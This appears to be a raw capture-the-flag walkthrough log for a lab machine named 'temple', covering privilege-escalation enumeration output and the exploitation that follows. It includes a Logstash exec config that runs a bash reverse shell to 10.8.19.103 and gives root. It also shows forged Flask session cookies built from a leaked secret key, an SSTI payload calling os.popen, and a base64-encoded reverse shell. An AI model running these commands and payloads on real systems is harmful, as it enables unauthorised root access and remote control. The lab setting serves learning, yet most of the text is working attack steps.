-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwSr--r-- 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 116K Jun 15  2021 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 427K Aug 11  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root telnetd 11K Nov  7  2016 /usr/lib/telnetlogin
-rwsr-xr-x 1 root root 40K Jan 27  2020 /snap/core/11743/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/11743/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/11743/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/11743/bin/su
-rwsr-xr-x 1 root root 27K Jan 27  2020 /snap/core/11743/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/11743/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/11743/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/11743/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/11743/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/11743/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Jan 20  2021 /snap/core/11743/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 11  2020 /snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Jun  7  2021 /snap/core/11743/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 109K Aug 27  2021 /snap/core/11743/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /snap/core/11743/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 40K Jan 27  2020 /snap/core/11316/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/11316/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/11316/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/11316/bin/su
-rwsr-xr-x 1 root root 27K Jan 27  2020 /snap/core/11316/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/11316/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/11316/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/11316/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/11316/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/11316/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Jan 20  2021 /snap/core/11316/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 11  2020 /snap/core/11316/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Jun  7  2021 /snap/core/11316/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 109K Jun 15  2021 /snap/core/11316/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /snap/core/11316/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 355K Aug 11  2021 /usr/bin/ssh-agent
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 35K May 26  2021 /snap/core/11743/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K May 26  2021 /snap/core/11743/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/11743/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/11743/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/11743/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/11743/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11743/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11743/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11743/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Jun  7  2021 /snap/core/11743/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Jan 27  2020 /snap/core/11743/usr/bin/wall
-rwxr-sr-x 1 root shadow 35K May 26  2021 /snap/core/11316/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K May 26  2021 /snap/core/11316/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/11316/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/11316/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/11316/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/11316/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11316/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11316/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11316/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Jun  7  2021 /snap/core/11316/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Jan 27  2020 /snap/core/11316/usr/bin/wall

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/usr/lib/x86_64-linux-gnu/libfakeroot
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Unexpected in root
/vmlinuz.old
/initrd.img
/swap.img
/initrd.img.old
/vmlinuz

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 36
drwxr-xr-x   2 root root 4096 Oct  3  2021 .
drwxr-xr-x 101 root root 4096 Oct  4  2021 ..
-rw-r--r--   1 root root   96 Aug 13  2020 01-locale-fix.sh
-rw-r--r--   1 root root  835 Jun 15  2021 apps-bin-path.sh
-rw-r--r--   1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--   1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x   1 root root  873 May 11  2021 Z99-cloudinit-warnings.sh
-rwxr-xr-x   1 root root 3417 May 11  2021 Z99-cloud-locale-test.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/frankie/.bash_history
/home/bill/flag1.txt
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/home/bill

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 5505 Jan 24 23:40 /var/log/cloud-init-output.log
-rw-r----- 1 root adm 0 Jul 25  2021 /var/log/apport.log
-rw-r----- 1 root adm 0 Oct  4  2021 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 802 Jan 24 23:40 /var/log/apache2/error.log
-rw-r----- 1 root adm 0 Oct  4  2021 /var/log/apache2/access.log

bill@temple:/etc$ find /etc -writable 2>/dev/null
find /etc -writable 2>/dev/null
/etc/logstash/conf.d/logstash-sample.conf

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash

bill@temple:/etc/logstash$ cat logstash.yml
cat logstash.yml
# Settings file in YAML
#
# Settings can be specified either in hierarchical form, e.g.:
#
#   pipeline:
#     batch:
#       size: 125
#       delay: 5
#
# Or as flat keys:
#
#   pipeline.batch.size: 125
#   pipeline.batch.delay: 5
#
# ------------  Node identity ------------
#
# Use a descriptive name for the node:
#
# node.name: test
#
# If omitted the node name will default to the machine's host name
#
# ------------ Data path ------------------
#
# Which directory should be used by logstash and its plugins
# for any persistent needs. Defaults to LOGSTASH_HOME/data
#
path.data: /var/lib/logstash
#
# ------------ Pipeline Settings --------------
#
# The ID of the pipeline.
#
# pipeline.id: main
#
# Set the number of workers that will, in parallel, execute the filters+outputs
# stage of the pipeline.
#
# This defaults to the number of the host's CPU cores.
#
# pipeline.workers: 2
#
# How many events to retrieve from inputs before sending to filters+workers
#
# pipeline.batch.size: 125
#
# How long to wait in milliseconds while polling for the next event
# before dispatching an undersized batch to filters+outputs
#
# pipeline.batch.delay: 50
#
# Force Logstash to exit during shutdown even if there are still inflight
# events in memory. By default, logstash will refuse to quit until all
# received events have been pushed to the outputs.
#
# WARNING: enabling this can lead to data loss during shutdown
#
# pipeline.unsafe_shutdown: false
#
# Set the pipeline event ordering. Options are "auto" (the default), "true" or "false".
# "auto" will  automatically enable ordering if the 'pipeline.workers' setting
# is also set to '1'.
# "true" will enforce ordering on the pipeline and prevent logstash from starting
# if there are multiple workers.
# "false" will disable any extra processing necessary for preserving ordering.
#
# pipeline.ordered: auto
#
# ------------ Pipeline Configuration Settings --------------
#
# Where to fetch the pipeline configuration for the main pipeline
#
# path.config:
#
# Pipeline configuration string for the main pipeline
#
# config.string:
#
# At startup, test if the configuration is valid and exit (dry run)
#
# config.test_and_exit: false
#
# Periodically check if the configuration has changed and reload the pipeline
# This can also be triggered manually through the SIGHUP signal
#
config.reload.automatic: true
#
# How often to check if the pipeline configuration has changed (in seconds)
# Note that the unit value (s) is required. Values without a qualifier (e.g. 60) 
# are treated as nanoseconds.
# Setting the interval this way is not recommended and might change in later versions.
#
config.reload.interval: 3s
#
# Show fully compiled configuration as debug log message
# NOTE: --log.level must be 'debug'
#
# config.debug: false
#
# When enabled, process escaped characters such as \n and \" in strings in the
# pipeline configuration files.
#
# config.support_escapes: false
#
# ------------ HTTP API Settings -------------
# Define settings related to the HTTP API here.
#
# The HTTP API is enabled by default. It can be disabled, but features that rely
# on it will not work as intended.
# http.enabled: true
#
# By default, the HTTP API is bound to only the host's local loopback interface,
# ensuring that it is not accessible to the rest of the network. Because the API
# includes neither authentication nor authorization and has not been hardened or
# tested for use as a publicly-reachable API, binding to publicly accessible IPs
# should be avoided where possible.
#
# http.host: 127.0.0.1
#
# The HTTP API web server will listen on an available port from the given range.
# Values can be specified as a single port (e.g., `9600`), or an inclusive range
# of ports (e.g., `9600-9700`).
#
# http.port: 9600-9700
#
# ------------ Module Settings ---------------
# Define modules here.  Modules definitions must be defined as an array.
# The simple way to see this is to prepend each `name` with a `-`, and keep
# all associated variables under the `name` they are associated with, and
# above the next, like this:
#
# modules:
#   - name: MODULE_NAME
#     var.PLUGINTYPE1.PLUGINNAME1.KEY1: VALUE
#     var.PLUGINTYPE1.PLUGINNAME1.KEY2: VALUE
#     var.PLUGINTYPE2.PLUGINNAME1.KEY1: VALUE
#     var.PLUGINTYPE3.PLUGINNAME3.KEY1: VALUE
#
# Module variable names must be in the format of
#
# var.PLUGIN_TYPE.PLUGIN_NAME.KEY
#
# modules:
#
# ------------ Cloud Settings ---------------
# Define Elastic Cloud settings here.
# Format of cloud.id is a base64 value e.g. dXMtZWFzdC0xLmF3cy5mb3VuZC5pbyRub3RhcmVhbCRpZGVudGlmaWVy
# and it may have an label prefix e.g. staging:dXMtZ...
# This will overwrite 'var.elasticsearch.hosts' and 'var.kibana.host'
# cloud.id: <identifier>
#
# Format of cloud.auth is: <user>:<pass>
# This is optional
# If supplied this will overwrite 'var.elasticsearch.username' and 'var.elasticsearch.password'
# If supplied this will overwrite 'var.kibana.username' and 'var.kibana.password'
# cloud.auth: elastic:<password>
#
# ------------ Queuing Settings --------------
#
# Internal queuing model, "memory" for legacy in-memory based queuing and
# "persisted" for disk-based acked queueing. Defaults is memory
#
# queue.type: memory
#
# If using queue.type: persisted, the directory path where the data files will be stored.
# Default is path.data/queue
#
# path.queue:
#
# If using queue.type: persisted, the page data files size. The queue data consists of
# append-only data files separated into pages. Default is 64mb
#
# queue.page_capacity: 64mb
#
# If using queue.type: persisted, the maximum number of unread events in the queue.
# Default is 0 (unlimited)
#
# queue.max_events: 0
#
# If using queue.type: persisted, the total capacity of the queue in number of bytes.
# If you would like more unacked events to be buffered in Logstash, you can increase the
# capacity using this setting. Please make sure your disk drive has capacity greater than
# the size specified here. If both max_bytes and max_events are specified, Logstash will pick
# whichever criteria is reached first
# Default is 1024mb or 1gb
#
# queue.max_bytes: 1024mb
#
# If using queue.type: persisted, the maximum number of acked events before forcing a checkpoint
# Default is 1024, 0 for unlimited
#
# queue.checkpoint.acks: 1024
#
# If using queue.type: persisted, the maximum number of written events before forcing a checkpoint
# Default is 1024, 0 for unlimited
#
# queue.checkpoint.writes: 1024
#
# If using queue.type: persisted, the interval in milliseconds when a checkpoint is forced on the head page
# Default is 1000, 0 for no periodic checkpoint.
#
# queue.checkpoint.interval: 1000
#
# ------------ Dead-Letter Queue Settings --------------
# Flag to turn on dead-letter queue.
#
# dead_letter_queue.enable: false

# If using dead_letter_queue.enable: true, the maximum size of each dead letter queue. Entries
# will be dropped if they would increase the size of the dead letter queue beyond this setting.
# Default is 1024mb
# dead_letter_queue.max_bytes: 1024mb

# If using dead_letter_queue.enable: true, the interval in milliseconds where if no further events eligible for the DLQ
# have been created, a dead letter queue file will be written. A low value here will mean that more, smaller, queue files
# may be written, while a larger value will introduce more latency between items being "written" to the dead letter queue, and
# being available to be read by the dead_letter_queue input when items are are written infrequently.
# Default is 5000.
#
# dead_letter_queue.flush_interval: 5000

# If using dead_letter_queue.enable: true, the directory path where the data files will be stored.
# Default is path.data/dead_letter_queue
#
# path.dead_letter_queue:
#
# ------------ Metrics Settings --------------
#
# Bind address for the metrics REST endpoint
#
# http.host: "127.0.0.1"
#
# Bind port for the metrics REST endpoint, this option also accept a range
# (9600-9700) and logstash will pick up the first available ports.
#
# http.port: 9600-9700
#
# ------------ Debugging Settings --------------
#
# Options for log.level:
#   * fatal
#   * error
#   * warn
#   * info (default)
#   * debug
#   * trace
#
# log.level: info
path.logs: /var/log/logstash
#
# ------------ Other Settings --------------
#
# Where to find custom plugins
# path.plugins: []
#
# Flag to output log lines of each pipeline in its separate log file. Each log filename contains the pipeline.name
# Default is false
# pipeline.separate_logs: false
#
# ------------ X-Pack Settings (not applicable for OSS build)--------------
#
# X-Pack Monitoring
# https://www.elastic.co/guide/en/logstash/current/monitoring-logstash.html
#xpack.monitoring.enabled: false
#xpack.monitoring.elasticsearch.username: logstash_system
#xpack.monitoring.elasticsearch.password: password
#xpack.monitoring.elasticsearch.proxy: ["http://proxy:port"]
#xpack.monitoring.elasticsearch.hosts: ["https://es1:9200", "https://es2:9200"]
# an alternative to hosts + username/password settings is to use cloud_id/cloud_auth
#xpack.monitoring.elasticsearch.cloud_id: monitoring_cluster_id:xxxxxxxxxx
#xpack.monitoring.elasticsearch.cloud_auth: logstash_system:password
# another authentication alternative is to use an Elasticsearch API key
#xpack.monitoring.elasticsearch.api_key: "id:api_key"
#xpack.monitoring.elasticsearch.ssl.certificate_authority: [ "/path/to/ca.crt" ]
#xpack.monitoring.elasticsearch.ssl.truststore.path: path/to/file
#xpack.monitoring.elasticsearch.ssl.truststore.password: password
#xpack.monitoring.elasticsearch.ssl.keystore.path: /path/to/file
#xpack.monitoring.elasticsearch.ssl.keystore.password: password
#xpack.monitoring.elasticsearch.ssl.verification_mode: certificate
#xpack.monitoring.elasticsearch.sniffing: false
#xpack.monitoring.collection.interval: 10s
#xpack.monitoring.collection.pipeline.details.enabled: true
#
# X-Pack Management
# https://www.elastic.co/guide/en/logstash/current/logstash-centralized-pipeline-management.html
#xpack.management.enabled: false
#xpack.management.pipeline.id: ["main", "apache_logs"]
#xpack.management.elasticsearch.username: logstash_admin_user
#xpack.management.elasticsearch.password: password
#xpack.management.elasticsearch.proxy: ["http://proxy:port"]
#xpack.management.elasticsearch.hosts: ["https://es1:9200", "https://es2:9200"]
# an alternative to hosts + username/password settings is to use cloud_id/cloud_auth
#xpack.management.elasticsearch.cloud_id: management_cluster_id:xxxxxxxxxx
#xpack.management.elasticsearch.cloud_auth: logstash_admin_user:password
# another authentication alternative is to use an Elasticsearch API key
#xpack.management.elasticsearch.api_key: "id:api_key"
#xpack.management.elasticsearch.ssl.certificate_authority: [ "/path/to/ca.crt" ]
#xpack.management.elasticsearch.ssl.truststore.path: /path/to/file
#xpack.management.elasticsearch.ssl.truststore.password: password
#xpack.management.elasticsearch.ssl.keystore.path: /path/to/file
#xpack.management.elasticsearch.ssl.keystore.password: password
#xpack.management.elasticsearch.ssl.verification_mode: certificate
#xpack.management.elasticsearch.sniffing: false
#xpack.management.logstash.poll_interval: 5s

bill@temple:/etc/logstash/conf.d$ ls
ls
logstash-sample.conf
bill@temple:/etc/logstash/conf.d$ cat *
cat *
# Sample Logstash configuration for creating a simple
# Beats -> Logstash -> Elasticsearch pipeline.

┌──(kali㉿kali)-[~/Downloads/temple]
└─$ cat logstash-sample.conf
input {
  exec {
    command => "/bin/bash -c 'bash -i >& /dev/tcp/10.8.19.103/4444 0>&1'"
    interval => 5
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}

┌──(kali㉿kali)-[~/Downloads/temple]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.181.180 - - [24/Jan/2023 20:36:15] "GET /logstash-sample.conf HTTP/1.1" 200 -

bill@temple:/etc/logstash/conf.d$ curl http://10.8.19.103:80/logstash-sample.conf -o logstash-sample.conf
<103:80/logstash-sample.conf -o logstash-sample.conf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --  0     0    0     0    0     0      0      0 --100   193  100   193    0     0    347      0 --100   193  100   193    0     0    346      0 --:--:-- --:--:-- --:--:--   346

┌──(kali㉿kali)-[~/Downloads/temple]
└─$ rlwrap nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.181.180.
Ncat: Connection from 10.10.181.180:44376.
bash: cannot set terminal process group (1291): Inappropriate ioctl for device
bash: no job control in this shell
root@temple:/# whoami
whoami
root
root@temple:/# cd /root
cd /root
root@temple:~# ls
ls
flag2.txt
script.sh
root@temple:~# cat flag2.txt
cat flag2.txt
f620630155081293669dbb7949f975fa9386f1cd
root@temple:~# cat script.sh
cat script.sh
#!/bin/bash
sleep 30
/bin/systemctl start logstash.service

Another method

Logged in as <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>

SECRET_KEY:   f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry

┌──(kali㉿kali)-[~/Downloads/temple]
└─$ echo 'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry' > secret_key      
                                                        
┌──(kali㉿kali)-[~/Downloads/temple]
└─$ cat secret_key 
f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry

┌──(kali㉿kali)-[~/Downloads/temple]
└─$ echo "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoie3tjb25maWd9fSJ9.Y9CI3Q.huUG93mqr9-Yr0sHZc3DaWR_3Lo" | base64 -d
{"logged_in":true,"username":"{{config}}"}base64: invalid input

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask

└─$ pip3 install flask-unsign
Defaulting to user installation because normal site-packages is not writeable
Collecting flask-unsign
  Downloading flask-unsign-1.2.0.tar.gz (14 kB)
  Preparing metadata (setup.py) ... done
Requirement already satisfied: flask in /usr/lib/python3/dist-packages (from flask-unsign) (2.2.2)
Requirement already satisfied: requests in /home/kali/.local/lib/python3.10/site-packages (from flask-unsign) (2.20.0)
Requirement already satisfied: itsdangerous in /usr/lib/python3/dist-packages (from flask-unsign) (2.1.2)
Requirement already satisfied: markupsafe in /usr/local/lib/python3.10/dist-packages (from flask-unsign) (2.1.1)
Requirement already satisfied: werkzeug in /usr/lib/python3/dist-packages (from flask-unsign) (2.2.2)
Requirement already satisfied: chardet<3.1.0,>=3.0.2 in /home/kali/.local/lib/python3.10/site-packages (from requests->flask-unsign) (3.0.4)
Requirement already satisfied: urllib3<1.25,>=1.21.1 in /home/kali/.local/lib/python3.10/site-packages (from requests->flask-unsign) (1.24.3)
Requirement already satisfied: idna<2.8,>=2.5 in /home/kali/.local/lib/python3.10/site-packages (from requests->flask-unsign) (2.6)
Requirement already satisfied: certifi>=2017.4.17 in /home/kali/.local/lib/python3.10/site-packages (from requests->flask-unsign) (2017.7.27.1)
Building wheels for collected packages: flask-unsign
  Building wheel for flask-unsign (setup.py) ... done
  Created wheel for flask-unsign: filename=flask_unsign-1.2.0-py3-none-any.whl size=14676 sha256=1dcb3fafc09b1d4ff5f9b7d0a6ce90e380aacc81633dbc453b8204bbbf0e30f4
  Stored in directory: /home/kali/.cache/pip/wheels/9d/c8/87/dac6332479e7acaadecbe5f965d6732f64dfb6b3b97cbc1001
Successfully built flask-unsign
Installing collected packages: flask-unsign
  WARNING: The script flask-unsign is installed in '/home/kali/.local/bin' which is not on PATH.
  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.
Successfully installed flask-unsign-1.2.0
                                                        
┌──(kali㉿kali)-[~/Downloads/temple]
└─$ export PATH=/home/kali/.local/bin:$PATH

┌──(kali㉿kali)-[~/Downloads/temple]
└─$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoie3tjb25maWd9fSJ9.Y9CI3Q.huUG93mqr9-Yr0sHZc3DaWR_3Lo'
{'logged_in': True, 'username': '{{config}}'}

https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}


┌──(kali㉿kali)-[~/Downloads/temple]
└─$ flask-unsign --sign --cookie "{'logged_in': True, 'username': '{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").read()}}'}" --secret 'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry'
.eJwdyEEKgCAQRuG7_KuC8ABdJWOwmkSYZkJrJd49afe9VyEWIx-UFPOTX57wFs4aLsaMWnfTM0VHtEsohagraXp-RLEtSJ-LhxWP1d12sw4e0mt0mcMxjK2hfX0vJGw.Y9CMgA.WETGAoKaBBvlVf_-dHVrYrMqgO8
                                                        
┌──(kali㉿kali)-[~/Downloads/temple]
└─$ flask-unsign --decode --cookie '.eJwdyEEKgCAQRuG7_KuC8ABdJWOwmkSYZkJrJd49afe9VyEWIx-UFPOTX57wFs4aLsaMWnfTM0VHtEsohagraXp-RLEtSJ-LhxWP1d12sw4e0mt0mcMxjK2hfX0vJGw.Y9CMgA.WETGAoKaBBvlVf_-dHVrYrMqgO8'
{'logged_in': True, 'username': '{{config.__class__.__init__.__globals__["os"].popen("ls").read()}}'}

┌──(kali㉿kali)-[~/Downloads/temple]
└─$ echo 'bash -i >& /dev/tcp/10.8.19.103/1337 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy8xMzM3IDA+JjEK

┌──(kali㉿kali)-[~/Downloads/temple]
└─$ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy8xMzM3IDA+JjEK | base64 -d  
bash -i >& /dev/tcp/10.8.19.103/1337 0>&1
                                                
┌──(kali㉿kali)-[~/Downloads/temple]
└─$ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy8xMzM3IDA+JjEK | base64 -d | bash
bash: connect: Connection refused
bash: line 1: /dev/tcp/10.8.19.103/1337: Connection refused


